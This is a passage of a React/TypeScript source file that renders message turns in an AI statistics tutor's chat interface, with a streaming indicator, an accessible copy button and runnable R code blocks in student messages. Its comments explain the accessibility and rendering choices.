    // announced repeatedly as it mutates, one of the worst-case
    // "torrent" failure modes for a streamed response. Flips to false
    // (and this element is then announced once, whole) the instant the
    // owning useChat call marks the turn done.
    <div className="message--ai" aria-busy={isStreaming}>
      {/* Message body — no speaker mark; layout difference vs. student
          messages is enough signal */}
      <div className="message__ai-body">
        {renderTurnChildren(children)}
        {/* Streaming indicator — three Heritage Gold dots in a staggered wave */}
        {isStreaming && (
          <span
            className="streaming-dot"
            aria-label="AI is responding"
            role="status"
          >
            <span aria-hidden="true" />
            <span aria-hidden="true" />
            <span aria-hidden="true" />
          </span>
        )}
      </div>

      {/* #327: per-turn actions. The row is rendered (and its height reserved
          in CSS) for every turn that HAS copyable text, including while that
          text is still streaming -- revealing the button on hover/focus is
          then a pure opacity change and cannot reflow a transcript the
          student is reading. The button sits below the turn, in space the
          turn's own bottom margin already occupied, so it never covers a
          word of the answer.

          It stays in the tab order at all times (opacity: 0 is still
          focusable) rather than being mounted on hover, which is what makes
          it reachable without a pointer; styles.css reveals it on
          :focus-within for the same reason. */}
      {source !== "" && (
        <div className="message__actions">
          <button
            type="button"
            className={`message__copy${copyState === "idle" ? "" : ` message__copy--${copyState}`}`}
            onClick={handleCopy}
            /* Stable across all three states, so a voice-control user's
               "click Copy the tutor's message" keeps working while the glyph
               changes; the transient wording goes to the live region below.

               #327 review finding 8 noted the earlier text-label version was
               a considered trade AGAINST WCAG 2.5.3 (for 1.8s the visible
               label read "Copied", which the name did not contain). Now that
               the control is icon-only there is no visible label, so 2.5.3 --
               which binds only when one exists -- does not apply, and the
               conflict is gone rather than traded away. */
            aria-label="Copy the tutor's message"
            /* Hidden mid-stream: the text is still growing, so a copy taken
               then is a half-answer. The ROW stays, so nothing moves. */
            hidden={isStreaming}
          >
            {(() => {
              const Glyph = COPY_GLYPH[copyState];
              return <Glyph size={15} weight="regular" aria-hidden="true" />;
            })()}
          </button>
          {/* aria-live WITHOUT role="status" on purpose: role="status" here
              would be a second one inside the same turn (the streaming dots
              above already carry it) and would collide with
              ConversationView's own single-status assertions. The live
              region alone is what does the announcing. */}
          <span className="sr-only" aria-live="polite">
            {copyState === "copied"
              ? "Message copied to clipboard."
              : copyState === "failed"
                ? "Couldn't copy the message. Select the text and copy it manually."
                : ""}
          </span>
        </div>
      )}
    </div>
  );
}

/** The student's own turn: R fences runnable, everything else verbatim.
 *
 *  Deliberately NOT markdown. Running a student's typing through an emphasis
 *  parser turns "5 * 3 * 2" into "5 3 2" with an italicised middle, silently
 *  corrupting arithmetic in a statistics course -- so the text segments are
 *  rendered literally, in a pre-wrap span that keeps the line breaks they
 *  typed. renderTextWithCode's own <p>/.trim() presentation would drop those.
 *
 *  The raw string is still what CopyButton copies, so a copy round-trips the
 *  fence exactly as written rather than the rendered result. */
function renderStudentBody(text: ReactNode, onRun?: (code: string) => Promise<RCodeResult>) {
  /* Anything that is not a plain string is passed through untouched -- there
     is nothing to split, and a caller handing this pre-built nodes has
     already decided how they render. */
  if (typeof text !== "string") return text;
  const segments = splitRCodeSegments(text);
  if (segments.length <= 1 && segments[0]?.type !== "code") return text;
  return segments.map((seg, i) =>
    seg.type === "code" ? (
      <CodeExecution key={`c${i}`} code={seg.value} onRun={onRun} />
    ) : (
      <span key={`t${i}`} className="message__student-text">
        {seg.value}
      </span>
    ),
  );
}

export function Message(props: MessageProps) {
  if (props.role === "ai") {
    return <AIMessage isStreaming={props.isStreaming}>{props.children}</AIMessage>;
  }

  if (props.role === "student") {
    return (
      <div className="message--student">
        {/* Deliberately NOT markdown-rendered. This is the student's own
            typing, and running it through an emphasis parser turns "5 * 3 *
            2" into "5 3 2" with an italicised middle -- silently corrupting
            arithmetic in a statistics course. What was actually missing was
            line breaks: the bubble now sets white-space: pre-wrap, so a
            multi-line question keeps the shape the student gave it. */}
        <div className="message__student-bubble">
          {renderStudentBody(props.children, props.onRun)}
        </div>
      </div>
    );
  }

  /* system */
  return (
    <div className="message--system" role="status">
      <span className="message__system-text">
        {props.children}
      </span>
    </div>
  );
}
